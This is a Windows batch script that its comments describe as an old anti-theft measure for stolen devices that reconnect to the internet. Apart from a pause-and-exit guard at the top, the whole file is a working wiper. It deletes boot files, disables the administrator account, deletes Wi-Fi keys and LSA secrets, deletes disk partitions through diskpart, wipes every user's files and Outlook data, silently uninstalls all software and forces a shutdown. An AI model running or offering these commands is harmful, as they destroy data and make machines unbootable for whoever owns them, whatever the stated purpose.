@echo off

REM I made this a long time ago upon request for something to run automatically against assets marked stolen should they reconnect to the internet
REM I added the exit at the top in case anyone (most likely me) runs this guy accidentally

pause
exit

REM Delete Boot Files

attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\windows\win.ini
del c:\windows\win.ini

REM Disable Local Admin, Delete WLAN Keys, Delete LSA Secrets

net user administrator /active:no
netsh wlan delete profile *
reg delete "HKEY_LOCAL_MACHINE\Security\Policy\Secrets"

REM Delete Recovery, System, and Reserved Partitions

echo select disk 0 >> C:\diskpart.txt
echo select partition 0 >> C:\diskpart.txt
echo delete partition override >> C:\diskpart.txt
echo select partition 1 >> C:\diskpart.txt
echo delete partition override >> C:\diskpart.txt
echo exit >> C:\diskpart.txt
diskpart /s C:\diskpart.txt

REM Delete User Files

cd C:\users
dir /b >> C:\users.txt
for /f "delims=" %%f in (C:\users.txt) do (
del /s /y C:\users\%%f\Documents
del /s /y C:\users\%%f\Desktop
del /s /y C:\users\%%f\Downloads
del /s /y C:\users\%%f\Pictures
del /s /y C:\users\%%f\Videos
del /s /y C:\users\%%f\Music
del C:\users\%%f\AppData\Local\Microsoft\Outlook\*.pst
del C:\users\%%f\AppData\Local\Microsoft\Outlook\*.ost
)

REM Uninstall All Software

wmic product get identifyingnumber | findstr { >> C:\wmic.txt
(for /f "tokens=1" %%a in (C:\wmic.txt) do echo %%a) > C:\guid.txt
for /f "delims=" %%f in (C:\guid.txt) do (
msiexec /x %%f /quiet
)

REM Clean Up and Shut Down

del C:\diskpart.txt
del C:\users.txt
del C:\wmic.txt
del C:\guid.txt
shutdown -t 0 -f
